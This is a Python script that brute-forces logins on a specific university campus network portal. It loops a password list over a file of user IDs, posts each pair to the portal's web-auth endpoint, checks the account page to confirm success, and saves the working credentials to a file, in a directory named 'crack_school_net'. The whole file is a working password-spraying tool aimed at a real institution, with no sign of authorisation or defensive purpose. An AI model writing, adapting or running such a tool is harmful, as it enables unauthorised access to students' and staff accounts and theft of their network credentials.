import requests
import re
import datetime as d

def log_sicau(id, pwd, num):
    session = requests.Session()
    t = d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_pwd = open('/home/duansq/crack_school_net/user_pwd.txt', 'a+')
    log = open('/home/duansq/crack_school_net/crak_pwd.log', 'a+')
    time_out = open('/home/duansq/crack_school_net/time_out.txt', 'a+')
    data = {
        'loginType': '',
        'auth_type': '0',
        'isBindMac': '1',
        'pageid': '161',
        'templatetype':  '1',
        'listbindmac': '1',
        'recordmac': '0',
        'isRemind': '0',
        'loginTimes': '',
        'groupId': '',
        'distoken': '',
        'url': 'http://1.1.1.1',
        'userId': id,
        'passwd': pwd,
        'twiceauth': '1'
    }
    try:
        post_url = 'http://10.255.248.9/webauth.do?wlanuserip=10.6.8.80&wlanacname=AC3&ssid=i_sicau&mac=E8-4E-06-58-A2-B8&url=http://1.1.1.1'  # 验证密码的网站
        session.post(post_url, data=data, timeout=5)
        try:
            data = session.get('http://10.255.248.9/self/selfmodifyPass.do', timeout=5)
        except:
               print(num, id, 'Connection_timed_out_2', t, file=log)
               print(id, file=time_out)
               print(num, id, 'Connection_timed_out_2')
        data.encoding = data.apparent_encoding
        user = re.compile('<input id="accountId" name="accountId" class="form-control" readonly="true" type="hidden" value="(.*)"/>').findall(data.text)
        if user[0] == id:
            print(id, pwd, file=user_pwd)
            print(num, id, pwd, 'crack_success', t, file=log)
            print(num, id, pwd, 'crack_success', t)
        else:
            print(num, id, 'wrong_password', t, file=log)
            print(num, id, pwd, 'wrong_password', t)
    except:
        print(num, id, 'Connection_timed_out_1', t, file=log)
        print(num, id, 'Connection_timed_out_1', t)
        print(id, file=time_out)


with open('/home/duansq/crack_school_net/user_id.txt', 'r') as r:
    user_set = r.readlines()
with open('/home/duansq/crack_school_net/pwd.txt', 'r') as r:
    pwd_set = r.readlines()

for pwd in pwd_set:
    a = 0
    for i in user_set:
        a += 1
        user = i[0:-1]
        log_sicau(user, pwd[:-1], a)
